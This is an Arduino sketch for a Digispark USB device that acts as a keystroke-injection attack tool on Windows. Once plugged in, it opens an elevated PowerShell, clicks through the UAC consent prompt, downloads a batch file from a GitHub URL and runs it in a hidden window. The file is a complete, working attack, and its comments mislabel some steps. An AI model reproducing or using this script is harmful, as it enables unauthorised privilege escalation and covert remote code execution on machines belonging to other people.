#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(5000); // Wait for 5 seconds after plugging in the Digispark
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Press Win+R to open the Run dialog
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell"); // Type "cmd" in the Run dialog
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // Press Ctrl+Shift+Enter to open cmd as administrator
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
  //DigiKeyboard.delay(100);
  DigiKeyboard.println("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/ionut270/FUN-batch/main/cow.bat\" -OutFile \"moo.bat\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden -command \"& 'moo.bat'; Stop-Process -Id $PID\"");
}

void loop() {}
